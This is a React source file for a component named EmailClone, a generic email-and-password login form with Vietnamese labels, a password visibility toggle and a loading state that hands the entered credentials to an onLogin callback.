import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Mail, Eye, EyeOff, Loader } from 'lucide-react';

const EmailClone = ({ onLogin, isLoading }) => {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (email && password) {
      onLogin({ username: email, password });
    }
  };

  return (
    <div 
      className="w-full h-full flex flex-col justify-center p-4 sm:p-6"
    >
      <div className="text-center mb-6">
        <Mail className="w-12 h-12 sm:w-16 sm:h-16 mx-auto text-primary mb-4" />
        <h1 className="text-2xl sm:text-3xl font-bold text-foreground">Đăng nhập bằng Email</h1>
      </div>
      <form onSubmit={handleSubmit} className="space-y-4 max-w-sm mx-auto w-full">
        <div>
          <Input
            type="email"
            placeholder="Địa chỉ email"
            required
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="text-sm sm:text-base"
          />
        </div>
        <div className="relative">
          <Input
            type={showPassword ? 'text' : 'password'}
            placeholder="Mật khẩu"
            required
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="pr-10 text-sm sm:text-base"
          />
           <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground hover:text-foreground"
            >
              {showPassword ? <EyeOff /> : <Eye />}
            </button>
        </div>
        <Button
          type="submit"
          className="w-full font-bold py-3 text-base sm:text-lg"
          disabled={isLoading}
        >
          {isLoading ? <Loader className="animate-spin" /> : 'Đăng nhập'}
        </Button>
      </form>
    </div>
  );
};

export default EmailClone;
